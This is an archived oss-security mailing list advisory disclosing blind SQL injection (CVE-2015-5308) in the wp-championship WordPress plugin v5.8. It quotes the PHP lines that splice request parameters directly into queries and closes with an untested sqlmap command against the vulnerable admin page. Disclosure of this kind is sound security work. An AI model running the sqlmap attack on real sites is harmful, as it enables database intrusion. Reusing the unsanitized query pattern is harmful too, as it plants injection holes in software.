X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2425" "Monday" "9" "November" "2015" "18:12:59" "-0500" "Larry Cashdollar" "larry0@me.com" "<D26692AB.28D03%larry0@me.com>" "66" "[oss-security] Blind SQL injection in wp-championship wordpress plugin v5.8" nil nil nil "11" "2015110923:12:59" "[oss-security] Blind SQL injection in wp-championship wordpress plugin v5.8" (number mark "U       larry0@me.co Nov  9   66/2425  " thread-indent "\"[oss-security] Blind SQL injection in wp-championship wordpress plugin v5.8\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22404 invoked by uid 550); 9 Nov 2015 23:13:22 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22359 invoked from network); 9 Nov 2015 23:13:16 -0000
User-Agent: Microsoft-MacOutlook/14.5.7.151005
Date: Mon, 09 Nov 2015 18:12:59 -0500
From: Larry Cashdollar <larry0@me.com>
To: Open Security <oss-security@lists.openwall.com>
Message-id: <D26692AB.28D03%larry0@me.com>
Thread-topic: Blind SQL injection in wp-championship wordpress plugin v5.8
MIME-version: 1.0
Content-type: multipart/alternative; boundary=B_3529937583_30720687
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2015-11-09_18:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0
 kscore.is_bulkscore=0 kscore.compositescore=1 compositescore=0.9
 suspectscore=0 phishscore=0 bulkscore=0 kscore.is_spamscore=0 rbsscore=0
 spamscore=0 urlsuspectscore=0.9 adultscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=8.0.1-1510090000 definitions=main-1511090389
Subject: [oss-security] Blind SQL injection in wp-championship wordpress plugin v5.8

--B_3529937583_30720687
Content-type: text/plain;
	charset="US-ASCII"
Content-transfer-encoding: 7bit

Title: Blind SQL injection in wp-championship wordpress plugin v5.8
Author: Larry W. Cashdollar, @_larry0
Date: 2015-10-22
Download Site: https://wordpress.org/plugins/wp-championship/
Vendor: https://profiles.wordpress.org/tuxlog/ http://www.tuxlog.de/
Vendor Notified: 2015-10-23, fixed in v5.9
Vendor Contact: webmaster@tuxlog.de
Description: wp-championship is a plugin for wordpress letting you play a
guessing game of a tournament e.g. soccer.
Vulnerability:
The following lines do not properly sanitize user input resulting in SQLi,
injection points are POST request
To user, isadmin,mail service,mailresceipt,stellv,champtipp and tippgroup.
Also GET requests to userid.

The code from cs_admin_users.php is as follows:

69                                 $sql="select count(*) as anz from
$cs_users where userid=".$_POST['user'].";";
 70                                 $results = $wpdb->get_row($sql);
.
.
 74                                         $sql = "insert into ". $cs_users
." values (". $_POST['user'] . "," . $_POST['isadmin'] . "," . $
_POST['mailservice'] . "," .$_POST['mailreceipt'] . "," . $_POST['stellv'] .
",".$_POST['champtipp'].",'1900-01-01 00:00:00',-1,'".$_POST
['tippgroup']."');";
 75                                         $results = $wpdb->query($sql);
.
.
86                                 $sql = "update ".$cs_users." set admin="
. $_POST['isadmin'] . ", mailservice=" . $_POST['mailservice'] .    ",
mailreceipt=" . $_POST['mailreceipt'] . ",stellvertreter=" .
$_POST['stellv'] . ",champion=" . $_POST['champtipp'] . ", tippgroup='".$
_POST['tippgroup']."' where userid=".$_POST['user'].";";
 87                                 $results = $wpdb->query($sql);
.
.
98                         $sql= "delete from ".$cs_users." where
userid=".$_GET['userid'].";";
99                         $results = $wpdb->query($sql);
.
.
110                         $sql= "select * from  $cs_users where
userid=".$_GET['userid'].";";
111                         $results = $wpdb->get_row($sql);
CVEID: 2015-5308
OSVDB:
Exploit Code:
Untested: 
$ sqlmap -u 
'http://wp.site:80/wp-admin/wp-championship/cs_admin_users.php&userid='
--data="isadmin=1&user" --cookie=AUTH_COOKIE_HERE --level=5 --risk=3
Screen Shots:
Advisory: http://www.vapidlabs.com/advisory.php?v=155



--B_3529937583_30720687--


